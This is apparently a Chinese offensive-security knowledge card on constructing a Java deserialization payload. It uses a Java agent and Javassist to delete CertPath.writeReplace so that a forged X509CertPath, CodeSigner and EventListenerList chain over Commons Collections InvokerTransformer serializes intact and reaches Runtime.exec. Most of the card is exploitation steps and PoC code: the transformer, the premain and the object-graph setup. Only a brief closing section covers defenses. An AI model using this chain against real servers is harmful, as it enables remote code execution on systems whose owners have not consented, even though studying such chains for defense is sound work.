---
id: web-java-deser-certpath-writereplace-agent-strip
title: 构造反序列化 payload 时用 Java Agent + Javassist 删除 CertPath.writeReplace：避免序列化被 CertPathRep 替换导致链中断
type: scenario
domain: web
path: web/java/deserialization
technique: certpath-writereplace-agent-strip
aliases:
- CertPath 序列化异常
- writeReplace 删除
- RemoveReplaceTransformer
- Javassist 修改 JDK 类
- X509CertPath 反序列化链构造
- java agent 去 writeReplace
tags:
- web
- java
- deserialization
- gadget-construction
- writereplace
- java-agent
- javassist
- certpath
- instrumentation
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V452
  verified_at: '2026-11-10T02:12:41+08:00'
  notes: 已对照原文与 12 张截图核对：CC 链调用栈(EventListenerList.readObject:277→add:187→UndoManager.toString→CodeSigner.toString:159→LazyList.get→TransformedList.set→InvokerTransformer.transform:120)、CertPath.writeReplace 源码 return new CertPathRep(type,getEncoded())、调试中 signerCertPath=X509CertPath/certs=LazyList/元素 ProcessImpl、TransformedList.set→transform→ChainedTransformer、InvokerTransformer、最终计算器弹出均有截图；原文只给 agent ClassFileTransformer 代码与'将agent加上'，未展示 premain/Manifest/启动参数，卡片已按 confidence:medium 标注并补全标准 premain 用法。卡片 PoC 将原文的 detach() 先于 toBytecode() 顺序修正为先 toBytecode() 再 detach()，更稳妥。原文 JDK 1.8.0_162/CC 3.2.1 仅为环境，未声明受影响版本，affected_versions 置空；链本身与既有 web-java-deser-commonscollections-transformedlist-invoker-arbitrary-method 重复已按 skipped 处理；未被验证点：未在本机复跑 agent 与 payload
---

# 一句话结论

构造包含 `X509CertPath`/`CodeSigner` 的 Java 反序列化链时，`java.security.cert.CertPath.writeReplace()` 会在序列化阶段把对象替换成 `CertPathRep(type, getEncoded())`，导致伪造的 `certs` 字段与后续 LazyList 链丢失（或直接抛异常）；可编写 `java.lang.instrument` 的 ClassFileTransformer，用 Javassist 在 `java/security/cert/CertPath` 加载时删除 `writeReplace` 方法，再序列化伪造的 X509CertPath，链即可完整落盘并执行。

# 原理

- **writeReplace 的序列化替换**：Java 序列化在写出对象前，若类声明了 `writeReplace()`，会先调用它并用返回值替代原对象。`CertPath.writeReplace()` 的实现是 `return new CertPathRep(type, getEncoded());`。对用 Unsafe 伪造的 X509CertPath（`certs` 指向含 LazyList/TransformedList 的恶意列表、`type` 为 null）来说，`getEncoded()` 会失败或得到无意义结果，且即使替换成功，对象也会变成 `CertPathRep`，原本精心构造的 `certs` 字段不再被序列化，链随即中断。
- **改类而不是改 payload**：与其在对象图上绕，不如修改攻击者构造端 JVM 中的类定义：agent 的 `ClassFileTransformer.transform` 收到类名为 `java/security/cert/CertPath` 的字节码时，用 Javassist `ClassPool.get("java.security.cert.CertPath")` 取类，`getDeclaredMethod("writeReplace")` 后 `removeMethod` 删除，`detach` 并返回 `toBytecode()`；其它类原样返回 `classfileBuffer`。此后 JVM 中的 CertPath 没有 writeReplace，序列化会按字段原样写出伪造对象。
- **时机与类加载器**：CertPath 由 bootstrap 类加载器加载，transformer 收到的 loader 为 null；转换必须发生在该类首次使用之前（agent 以 `premain` 方式随 JVM 启动注册，或在支持 retransform 的环境里 attach）。过早/过晚加载都会导致删除不生效。
- **作用范围**：这是 payload 构造侧技巧——被修改的是攻击者本地的打包/测试 JVM，不涉及目标服务器；目标只要能反序列化包含 X509CertPath/CodeSigner 的流即可。
- **配套链示例**：`EventListenerList.readObject` → `add(type, UndoManager)` 因类型不匹配构造异常消息时调用 `UndoManager.toString` → `Vector.toString` → `CodeSigner.toString` → `signerCertPath.getCertificates().get(0)` → `LazyList.get(0)`（元素为 null → `ConstantFactory.create()` 返回 ChainedTransformer，再 `set` 到底层 TransformedList）→ `TransformedList.set` → `ChainedTransformer.transform` → InvokerTransformer → `Runtime.exec`。

# 触发条件

- 目标链需要经过重写了 `writeReplace` 的类（典型为 CertPath/X509CertPath），且该 writeReplace 会替换对象或抛异常，导致链无法序列化。
- 攻击者控制 payload 生成端 JVM：能使用 `-javaagent` 挂载 premain agent（或有 retransform 能力）。
- 具备 Javassist/ASM 等字节码修改库。
- 目标端 classpath/JDK 含链所需类（如 Commons Collections 3.2.1、EventListenerList、UndoManager、CodeSigner、X509CertPath），且反序列化入口可用（JDK 8 案例为 1.8.0_162）。

# 利用步骤

1. 编写 ClassFileTransformer：类名等于 `java/security/cert/CertPath` 时，Javassist 删除 `writeReplace` 方法并返回新字节码；其他类返回原字节数组。
2. 打包为 agent jar，Manifest 指定 `Premain-Class`；`premain` 中调用 `Instrumentation.addTransformer(new RemoveReplaceTransformer())`。
3. 以 `-javaagent:<agent>.jar` 启动 payload 生成程序，确保 CertPath 在转换器注册之后才被加载（必要时在 premain 中提前触发加载）。
4. 构造对象图：`ArrayList` 放 null，`TransformedList.decorate(list, chainedTransformer)`；`LazyList.decorate(transformedList, new ConstantFactory(chainedTransformer))`；用 Unsafe 将 `X509CertPath.certs` 指向该 LazyList，`CodeSigner.signerCertPath` 指向 X509CertPath，`UndoManager.edits` 加入 CodeSigner，`EventListenerList.listenerList = {InternalError.class, UndoManager}`。
5. 序列化 EventListenerList；确认不再被替换为 CertPathRep、无 NotSerializableException，得到完整 Base64 payload。
6. 在目标反序列化入口投放，验证调用栈 `EventListenerList.readObject → add → UndoManager.toString → ... → InvokerTransformer.transform` 与命令执行结果。

# PoC

```java
package com.n1ght;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class RemoveReplaceTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer)
            throws IllegalClassFormatException {
        if ("java/security/cert/CertPath".equals(className)) {
            try {
                ClassPool pool = ClassPool.getDefault();
                CtClass ctClass = pool.get("java.security.cert.CertPath");
                CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
                ctClass.removeMethod(writeReplace);
                byte[] bytes = ctClass.toBytecode();
                ctClass.detach();
                return bytes;
            } catch (Exception e) {
                System.out.println(e);
            }
        }
        return classfileBuffer;
    }
}
```

```java
// 配套 premain（agent jar 的 Premain-Class）
public static void premain(String args, java.lang.instrument.Instrumentation inst) {
    inst.addTransformer(new RemoveReplaceTransformer());
}
```

```java
// 对象图核心（省略 Unsafe 工具与异常处理）
ArrayList<Object> list = new ArrayList<>();
list.add(null);
List decorate1 = TransformedList.decorate(list, chainedTransformer);
List decorate  = LazyList.decorate(decorate1, new ConstantFactory(chainedTransformer));
X509CertPath certPath = (X509CertPath) unsafe.allocateInstance(X509CertPath.class);
unsafe.putObject(certPath, unsafe.objectFieldOffset(X509CertPath.class.getDeclaredField("certs")), decorate);
CodeSigner signer = (CodeSigner) unsafe.allocateInstance(CodeSigner.class);
unsafe.putObject(signer, unsafe.objectFieldOffset(CodeSigner.class.getDeclaredField("signerCertPath")), certPath);
// UndoManager.edits 加入 signer，EventListenerList.listenerList = {InternalError.class, undoManager}
// 序列化 EventListenerList 即可
```

# 变体与关联

- **同类 writeReplace 处理**：任何在链中重写 writeReplace/readResolve 的类都可能需要用同样方式移除或替换；也可在不能改类时改用不受该机制影响的等价 gadget。
- **链本身**：`TransformedList.set + LazyList.get + InvokerTransformer` 组合见 [[web-java-deser-commonscollections-transformedlist-invoker-arbitrary-method]]；EventListenerList 触发任意 toString 见 [[web-java-deserialization-jdk-eventlistenerlist-tostring]]；EventListenerList 接 Spring AOP/TemplatesImpl 见 [[web-java-deser-spring-aop-jdk17-templatesimpl-chain]]。
- **agent 改类相关技巧**：agentmain 改写类植入内存马参见 [[web-java-classloader-agentmain-filterchain-dynamic-servletregistration]]、[[web-java-classloader-deser-attach-agent-filterchain-memshell]]；本卡是在构造端离线使用，不向目标投递 agent。
- **替代思路**：用 Unsafe 直接伪造已序列化字段、或用 writeObject/readObject 自定义钩子绕过；确认目标 JDK 是否仍受模块封装影响。

# 检测与防御

- **目标侧防御**：原生反序列化入口启用 `ObjectInputFilter` 白名单，禁止 `java.security.cert.X509CertPath`、`CodeSigner`、`EventListenerList`、`UndoManager` 等非业务类；移除/升级 Commons Collections 3.x；避免原生序列化协议。
- **构造端**：该技巧只决定 payload 能否序列化，不改变目标端的检测与防御要求；不要把它当作绕过目标过滤的手段。
- 检测重点仍是目标收到的序列化流内容（上述类名组合）与反序列化后的命令执行/异常行为。
